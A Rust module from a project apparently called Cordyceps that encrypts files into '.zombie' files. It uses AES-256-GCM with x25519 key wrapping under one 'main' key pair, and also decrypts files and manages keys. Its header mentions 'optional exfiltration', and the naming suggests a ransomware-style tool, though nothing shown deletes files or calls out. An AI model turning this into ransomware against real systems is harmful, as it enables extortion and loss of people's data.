//! Cryptographic operations for file encryption and decryption.
//!
//! This module contains the core logic for encrypting and decrypting files,
//! as used by the CLI interface. It defines the encryption and decryption
//! routines, and is responsible for handling cryptographic workflows,
//! such as file processing, key usage, and optional exfiltration.

use std::{
    fs::{File, read_to_string},
    io::{self, Read, Write},
    path::{Path, PathBuf},
};

use aes_gcm::{
    Aes256Gcm,
    aead::{Aead, KeyInit, Nonce},
};
use base64::{Engine, engine::general_purpose::STANDARD_NO_PAD};
use hkdf::Hkdf;
use log::{debug, error, info};
use rand::{RngCore, rngs::OsRng};
use x25519_dalek::{EphemeralSecret, PublicKey, StaticSecret};

use crate::error::CryptoError;

/// Encrypted files extension.
pub const EXTENSION: &'static str = "zombie";

/// Magic bytes to identify Cordyceps encrypted files
const MAGIC_BYTES: &[u8; 4] = b"CORD";

/// .zombie file format version
const FILE_FORMAT_VERSION: u8 = 0x01;

/// .zombie header size in bytes--the ciphertext (+ its GCM tag) is considered the payload, after the header:
/// ```
/// - Magic bytes.................: 04
/// - Version.....................: 01
/// - Ephemeral PubKey............: 32
/// - Encrypted AES key + tag.....: 48 (32 + 16)
/// - Key encapsulation nonce.....: 12
/// - File content AES-GCM nonce..: 12
/// - TOTAL.......................: 109 bytes
/// ```
const ZOMBIE_HEADER_SIZE: usize = 109;

/// Encrypts a file using AES-GCM for content and ECIES-like key encapsulation
/// for the AES key using Curve25519--x25519-dalek.
///
/// The encrypted file will have a `.zombie` extension and its header will
/// include:
/// - Magic bytes--`CORD`
/// - File format version
/// - Ephemeral public key--generated during encryption
/// - Encrypted AES key + tag--encrypted with AES-GCM with a derived key from
///   ECDH
/// - AES-GCM nonce for key encapsulation
/// - AES-GCM nonce for file content encryption
/// Note: AES-GCM tags are concatenated with their respective ciphertexts
/// by aes_gcm.
///
/// # Arguments
/// - `path`: The path of the file to be encrypted.
/// - `public_key`: The main public key in x25519_dalek::PublicKey type.
///
/// # Returns
/// A `Result` containing the path to the newly created `.zombie` file on
/// success, or a `CryptoError` if encryption fails.
pub fn encrypt(path: &Path, public_key: &PublicKey) -> Result<PathBuf, CryptoError> {
    info!("Starting encryption for file: {:?}", path);

    // 1. Read file content
    let mut file = File::open(path)?;
    let mut plaintext = Vec::new();
    file.read_to_end(&mut plaintext)?; // TODO: read file by chunks
    debug!("Read {} bytes from {:?}", plaintext.len(), path);

    // 2. Generate random AES-GCM key and nonce for file content encryption
    let mut file_aes_key_bytes = [0u8; 32]; // 32-byte long AES key
    OsRng.try_fill_bytes(&mut file_aes_key_bytes)?;
    let file_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&file_aes_key_bytes);
    let cipher_file_aes_gcm = Aes256Gcm::new(file_aes_key);

    let mut file_aes_nonce_bytes = [0u8; 12]; // 12-byte long nonce
    OsRng.try_fill_bytes(&mut file_aes_nonce_bytes)?;
    let file_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&file_aes_nonce_bytes);
    debug!("Generated AES-GCM key and nonce for file content");

    // 3. Encrypt file content with AES-GCM
    let ciphertext_with_tag = cipher_file_aes_gcm
        .encrypt(file_aes_nonce, plaintext.as_ref())
        // map_err is the most effective way to convert error types here
        // because aes_gcm::aead::Error does NOT implement the trait
        // std::error::Error needed by thiserror in error.rs.
        // error handling in Rust is sometimes VERY frustrating.
        .map_err(|e| {
            CryptoError::SymmetricEncryptError(format!(
                "AES-GCM file content encryption failed: {:?}",
                e
            ))
        })?;
    debug!(
        "File content encrypted. Combined ciphertext+tag size: {}",
        ciphertext_with_tag.len()
    );

    // 4. ECIES-like key encapsulation for the AES-GCM key
    let ephemeral_secret = EphemeralSecret::random_from_rng(OsRng);
    let ephemeral_public = PublicKey::from(&ephemeral_secret);
    debug!("Generated ephemeral Curve25519 key pair");

    let shared_secret = ephemeral_secret.diffie_hellman(&public_key);
    debug!("Derived shared secret using ECDH");

    // Use HKDF to derive an AES-GCM key for encrypting the file_aes_key
    let hkdf = Hkdf::<sha2::Sha256>::new(None, shared_secret.as_bytes());
    let mut key_enc_aes_key_derived_bytes = [0u8; 32];
    hkdf.expand(
        b"key_encapsulation_aes_key_derivation",
        &mut key_enc_aes_key_derived_bytes,
    )
    .map_err(|_| CryptoError::KdfError)?;
    let key_enc_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_enc_aes_key_derived_bytes);
    let cipher_key_enc_aes_gcm = Aes256Gcm::new(key_enc_aes_key);

    let mut key_enc_aes_nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut key_enc_aes_nonce_bytes);
    let key_enc_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&key_enc_aes_nonce_bytes);
    debug!("Derived AES-GCM key and nonce for key encapsulation");

    // Encrypt the file_aes_key_bytes with the derived AES-GCM key
    let encrypted_file_aes_key_with_tag = cipher_key_enc_aes_gcm
        .encrypt(key_enc_aes_nonce, file_aes_key_bytes.as_ref())
        .map_err(|e| {
            CryptoError::SymmetricEncryptError(format!(
                "AES-GCM encryption of file AES key failed: {:?}",
                e
            ))
        })?;
    debug!("File AES key encrypted with AES-GCM");

    // 5. .zombie file creation and opening for writing
    let mut zombie_path = path.to_path_buf();
    let original_file_name = zombie_path.file_name().ok_or_else(|| {
        CryptoError::Io(io::Error::new(
            io::ErrorKind::InvalidInput,
            "Invalid file name for encryption",
        ))
    })?;
    let mut new_file_name = original_file_name.to_os_string();
    new_file_name.push(".");
    new_file_name.push(EXTENSION);
    zombie_path.set_file_name(new_file_name);
    info!("Creating encrypted file: {:?}", zombie_path);
    let mut output_file = File::create(&zombie_path)?;

    // 6. Write the header to the .zombie file
    output_file.write_all(MAGIC_BYTES)?; // 4 bytes
    output_file.write_all(&[FILE_FORMAT_VERSION])?; // 1 byte
    output_file.write_all(ephemeral_public.as_bytes())?; // 32 bytes
    output_file.write_all(&encrypted_file_aes_key_with_tag)?; // 48 bytes
    output_file.write_all(key_enc_aes_nonce.as_slice())?; // 12 bytes
    output_file.write_all(file_aes_nonce.as_slice())?; // 12 bytes
    debug!("Wrote encrypted file header");

    // 7. Write the content ciphertext (with tag)
    output_file.write_all(&ciphertext_with_tag)?;
    debug!("File content written to encrypted file");

    Ok(zombie_path)
}

/// Decrypts a `.zombie` file.
/// Requires the corresponding private key to the main public key used
/// during encryption.
///
/// The function reads the header from the `.zombie` file to extract:
/// - Ephemeral public key
/// - Encrypted AES key + tag (file content)
/// - AES-GCM nonce for key encapsulation
/// - AES-GCM nonce for file content encryption
/// Note: AES-GCM tags are concatenated with their respective ciphertexts
/// by aes_gcm.
///
/// # Arguments:
/// - `path`: A reference to the path of the `.zombie` file to be decrypted.
/// - `private_key`: The private key to decrypt files in
/// x25519_dalek::StaticSecret format.
///
/// # Returns
/// A `Result` containing the path to the newly created decrypted file on
/// success, or a `CryptoError` if decryption fails.
pub fn decrypt(path: &Path, private_key: &StaticSecret) -> Result<PathBuf, CryptoError> {
    info!("Starting decryption for file: {:?}", path);

    // 1. Read the .zombie file header
    let mut encrypted_file = File::open(path)?;
    let mut header_bytes = [0u8; ZOMBIE_HEADER_SIZE];
    encrypted_file.read_exact(&mut header_bytes)?;
    debug!("Read header bytes from {:?}", path);

    // 2. Parse header
    let mut cursor = io::Cursor::new(header_bytes);

    // Magic bytes
    let mut magic_read = [0u8; 4];
    cursor
        .read_exact(&mut magic_read)
        .map_err(|_| CryptoError::InvalidZombieFile("Failed to read magic bytes".to_string()))?;
    if &magic_read != MAGIC_BYTES {
        error!("Invalid magic bytes found in header");
        return Err(CryptoError::InvalidZombieFile(
            "Invalid magic bytes".to_string(),
        ));
    }
    debug!("Magic bytes verified");

    // Version
    let mut version_read = [0u8; 1];
    cursor
        .read_exact(&mut version_read)
        .map_err(|_| CryptoError::InvalidZombieFile("Failed to read version byte".to_string()))?;
    if version_read[0] != FILE_FORMAT_VERSION {
        error!(
            "Unsupported file format version: {}, expected {}",
            version_read[0], FILE_FORMAT_VERSION
        );
        return Err(CryptoError::InvalidZombieFile(
            "Unsupported version".to_string(),
        ));
    }
    debug!("File format version verified");

    // Ephemeral public key (32 bytes)
    let mut ephemeral_public_key = [0u8; 32];
    cursor.read_exact(&mut ephemeral_public_key).map_err(|_| {
        CryptoError::InvalidZombieFile("Failed to read ephemeral public key".to_string())
    })?;

    // Encrypted file AES key (+ 16 byte tag)
    let mut encrypted_file_aes_key_with_tag = [0u8; 48];
    cursor
        .read_exact(&mut encrypted_file_aes_key_with_tag)
        .map_err(|_| {
            CryptoError::InvalidZombieFile("Failed to read encrypted AES key".to_string())
        })?;

    // AES-GCM nonce for key encapsulation
    let mut key_enc_aes_nonce_bytes = [0u8; 12];
    cursor
        .read_exact(&mut key_enc_aes_nonce_bytes)
        .map_err(|_| {
            CryptoError::InvalidZombieFile(
                "Failed to read AES-GCM nonce for key encapsulation".to_string(),
            )
        })?;
    let key_enc_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&key_enc_aes_nonce_bytes);

    // AES-GCM nonce for file content
    let mut file_aes_nonce_bytes = [0u8; 12];
    cursor.read_exact(&mut file_aes_nonce_bytes).map_err(|_| {
        CryptoError::InvalidZombieFile("Failed to read AES-GCM nonce for file content".to_string())
    })?;
    let file_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&file_aes_nonce_bytes);

    debug!("Parsed .zombie header");

    // Ciphertext + AES-GCM tag extraction
    let mut file_content_ciphertext_with_tag = Vec::new();
    encrypted_file.read_to_end(&mut file_content_ciphertext_with_tag)?;
    debug!(
        "Read ciphertext+tag. Size: {}",
        file_content_ciphertext_with_tag.len()
    );

    // 3. ECIES-like decapsulation for the file AES key (with AES-GCM)
    let ephemeral_public = PublicKey::from(ephemeral_public_key);
    let shared_secret = private_key.diffie_hellman(&ephemeral_public);
    debug!("Derived shared secret with ECDH");

    let hkdf = Hkdf::<sha2::Sha256>::new(None, shared_secret.as_bytes());
    let mut key_enc_aes_key_derived_bytes = [0u8; 32];
    hkdf.expand(
        b"key_encapsulation_aes_key_derivation",
        &mut key_enc_aes_key_derived_bytes,
    )
    .map_err(|_| CryptoError::KdfError)?;
    let key_enc_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_enc_aes_key_derived_bytes);
    let cipher_key_enc_aes_gcm = Aes256Gcm::new(key_enc_aes_key);
    debug!("Derived AES-GCM key for key encapsulation decryption");

    let file_aes_key_bytes = cipher_key_enc_aes_gcm
        .decrypt(key_enc_aes_nonce, encrypted_file_aes_key_with_tag.as_ref())
        .map_err(|e| {
            if e.to_string().contains("tag verification failed") {
                CryptoError::AuthenticationTagMismatch
            } else {
                CryptoError::SymmetricDecryptError(format!(
                    "AES-GCM decryption of file AES key failed: {:?}",
                    e
                ))
            }
        })?;
    let file_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&file_aes_key_bytes);
    let cipher_file_aes_gcm = Aes256Gcm::new(file_aes_key);
    debug!("File AES key decrypted");

    // 4. Decrypt file content with AES-GCM
    let plaintext = cipher_file_aes_gcm
        .decrypt(file_aes_nonce, file_content_ciphertext_with_tag.as_ref())
        .map_err(|e| {
            if e.to_string().contains("tag verification failed") {
                CryptoError::AuthenticationTagMismatch
            } else {
                CryptoError::SymmetricDecryptError(format!(
                    "AES-GCM decryption of file content failed: {:?}",
                    e
                ))
            }
        })?;
    debug!(
        "File content decrypted. Plaintext size: {}",
        plaintext.len()
    );

    // 5. Construct the decrypted file path
    let mut decrypted_path = path.to_path_buf();
    decrypted_path.set_extension("");
    info!("Creating decrypted file: {:?}", decrypted_path);

    // 6. Write decrypted content to the new file
    let mut output_file = File::create(&decrypted_path)?;
    output_file.write_all(&plaintext)?;
    info!("Decrypted content written to file");

    Ok(decrypted_path)
}

/// Generates a new 32 bytes (256 bits) Curve25519 key pair.
///
/// Both private and public key are encoded in base 64 for better storing and
/// sharing.
///
/// # Arguments
/// - `path`: The path to save the generated key pair named
/// `main-private.key` and `main-public.key`.
///
/// # Returns
/// A `Result` with a unit type on success or a `CryptoError` if key generation
/// or file saving fails.
pub fn generate(path: &Path) -> Result<(), CryptoError> {
    if !path.exists() || !path.is_dir() {
        return Err(CryptoError::Io(io::Error::new(
            io::ErrorKind::NotFound,
            format!("Path not found or not a directory: {:?}", path),
        )));
    }

    info!("Generating new main key pair");

    let private_key = StaticSecret::random_from_rng(OsRng);
    let private_key_bytes = private_key.to_bytes();
    let private_key_b64 = b64_encode(&private_key_bytes);
    let private_key_path = path.join("main-private.key");

    let public_key: PublicKey = (&private_key).into();
    let public_key_bytes = public_key.to_bytes();
    let public_key_b64 = b64_encode(&public_key_bytes);
    let public_key_path = path.join("main-public.key");

    let mut file = File::create(&private_key_path)?;
    file.write_all(private_key_b64.as_ref())?;
    info!("Main private key saved to: {:?}", private_key_path);

    let mut file = File::create(&public_key_path)?;
    file.write_all(public_key_b64.as_ref())?;
    info!("Main public key saved to: {:?}", public_key_path);

    // Making sure the encoded keys are valid
    if let Ok(prikey) = b64_decode(&private_key_b64) {
        assert_eq!(private_key_bytes, prikey);
    }
    if let Ok(pubkey) = b64_decode(&public_key_b64) {
        assert_eq!(public_key_bytes, pubkey);
    }

    Ok(())
}

/// Encodes a byte slice into a Base64 string.
///
/// This function takes a byte slice and encodes it into a standard Base64 string
/// using the `STANDARD_NO_PAD` engine. This is a common choice for cryptographic
/// keys or hashes as it omits the trailing padding characters (`=`).
///
/// # Arguments
/// - `key_bytes`: The byte slice (`&[u8]`) to be encoded.
///
/// # Returns
/// A `String` containing the Base64-encoded representation of the input bytes.
pub fn b64_encode(key_bytes: &[u8]) -> String {
    STANDARD_NO_PAD.encode(key_bytes)
}

/// Decodes a Base64 string into a byte vector.
///
/// This function decodes a Base64 string using the `STANDARD` engine, which can
/// successfully decode both padded and unpadded Base64 strings. It returns an
/// `AppError` if the input string contains invalid Base64 characters.
///
/// The function assures to return a fixed-length array of 32 bytes because its
/// the expected input for the encryption function.
///
/// # Arguments
/// - `key_b64`: The Base64-encoded string slice (`&str`) to be decoded.
///
/// # Returns
/// A `Result` containing the decoded bytes ([u8; 32]) on success or an
/// `AppError` if the decoding fails.
pub fn b64_decode(key_b64: &str) -> Result<[u8; 32], CryptoError> {
    let decoded_vec = STANDARD_NO_PAD.decode(key_b64)?;

    if decoded_vec.len() != 32 {
        return Err(CryptoError::InvalidLengthError);
    }

    let fixed_array: [u8; 32] = decoded_vec.try_into().unwrap();
    Ok(fixed_array)
}

/// Loads a Base64-encoded private key from a file and returns a
/// `StaticSecret`.
///
/// Reads the file at the given path, decodes its Base64 contents, and converts
/// the result into a 32-byte `StaticSecret` used for cryptographic operations.
///
/// # Arguments
/// - `path`: Path to the Base64-encoded private key file.
///
/// # Returns
/// A `Result` containing the `StaticSecret` on success, or a `CryptoError` if
/// the file cannot be read, decoding fails, or the key is not 32 bytes long.
pub fn load_private_key(key: &Path) -> Result<StaticSecret, CryptoError> {
    let key_b64 = read_to_string(key)?;
    let key_bytes = b64_decode(key_b64.trim())?;
    let key_array =
        <[u8; 32]>::try_from(key_bytes.as_slice()).map_err(|_| CryptoError::InvalidKey)?;
    Ok(StaticSecret::from(key_array))
}

/// Loads a Base64-encoded public key from a file and returns a `PublicKey`.
///
/// Reads the file at the given path, decodes its Base64 contents, and converts
/// the result into a 32-byte `PublicKey` used for cryptographic operations.
///
/// # Arguments
/// - `path`: Path to the Base64-encoded public key file.
///
/// # Returns
/// A `Result` containing the `PublicKey` on success, or a `CryptoError` if
/// the file cannot be read, decoding fails, or the key is not 32 bytes long.
pub fn load_public_key(key: &Path) -> Result<PublicKey, CryptoError> {
    let key_b64 = read_to_string(key)?;
    let key_bytes = b64_decode(key_b64.trim())?;
    let key_array =
        <[u8; 32]>::try_from(key_bytes.as_slice()).map_err(|_| CryptoError::InvalidKey)?;
    Ok(PublicKey::from(key_array))
}
